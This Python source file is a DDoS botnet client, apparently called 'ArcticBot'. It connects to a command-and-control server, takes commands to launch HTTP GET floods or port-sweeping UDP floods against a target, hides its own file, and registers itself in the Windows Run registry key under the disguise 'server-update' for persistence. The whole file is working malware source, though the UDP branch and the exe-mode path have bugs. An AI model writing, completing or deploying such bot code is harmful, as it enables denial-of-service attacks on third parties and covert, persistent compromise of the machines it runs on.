mode = 'py'
address = '127.0.0.1'
port = 6240
Threads = 2
buffsize = 512
Attribute_hide = True
Self_starting = True
#Testing code, will be delete in generation
from socket import *
import threading
from random import _urandom
import requests
from os.path import abspath
from sys import argv
s = socket(AF_INET, SOCK_STREAM)
ddos_flag = False
path = abspath(argv[0])

def ddos(mode, ip): #ip : ip or url
    # Attack method
    print("[*]Start attack")
    if mode == 'httpflood': # httpflood method : only http GET flood
        def http_get_request(ip):
            global ddos_flag
            while True:
                if ddos_flag: return
                try:
                    response = requests.get(ip)
                    print('[*]code:', response.status_code)
                except Exception as e:
                    print(e)
                    pass
        print('[*]Attack:', ip)
        for i in range(Threads): threading.Thread(target=http_get_request, args=(ip,)).start()
    if mode == 'udpflood': # UDPflood
        sock = socket(AF_INET, SOCK_DGRAM)
        byte = _urandom(1490)
        if port == "" or port == ' ': 
            port = 1
            is_all = True
        else:
            port = int(port)
            is_all = False

        sent = 0

        while True:
            sock.sendto(byte, (ip, port))
            sent = sent + 1
            print(f"[*] Sent " + str(sent) + " packet to " + ip + " through port " + str(port))
            if is_all:
                port = port + 1
            else:
                pass

            if port == 65534:
                port = 1
def connect():
    global s
    try:
        try:
            s.connect((address, port))
            if s.recv(buffsize).decode('utf8') == 'ArcticBotCheck':
                s.send('CheckOK'.encode('utf8'))
            print(f'[*]Connected to {address} : {port}')
        except ConnectionRefusedError:
            print('[*]reset')
            connect()
        while True:
            global ddos_flag
            recvdata = s.recv(buffsize).decode('utf-8')
            print('[*]'+recvdata)
            if recvdata == 'stop_ddos':
                ddos_flag = True
            if recvdata.split('_')[0] == 'attack':
                ddos_flag = False
                threading.Thread(target=ddos, args=(recvdata.split('_')[1], recvdata.split("_")[2],)).start()
            if recvdata == 'heartbeat':
                s.send("heartbeat".encode("utf8"))
    except Exception as e:
        print(e)
        s.close()
        s = socket(AF_INET, SOCK_STREAM)
        connect()
def hide():
    global path
    if Attribute_hide:
        import win32api, win32con
        win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN) 
        print("[*]File hidden") 
    if Self_starting:
        print('[*]Installing to "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"')
        reg_root = win32con.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = win32api.RegOpenKey(reg_root, reg_path, 0, win32con.KEY_ALL_ACCESS)
        if mode == 'py':
            win32api.RegSetValueEx(key, "server-update", 0, win32con.REG_SZ, path)
        if mode == 'exe':
            win32api.RegSetValueEx(key, "server-update", 0, win32con.REG_SZ, 'python' + path)
        win32api.RegCloseKey(key)
        print("[+]Installed")
if __name__ == '__main__':
    print("[*]start")
    # threading.Thread(target=connect).start()
    try:
        hide()
        connect()
    except Exception as e:
        print(e)

# Blank line(will be delete)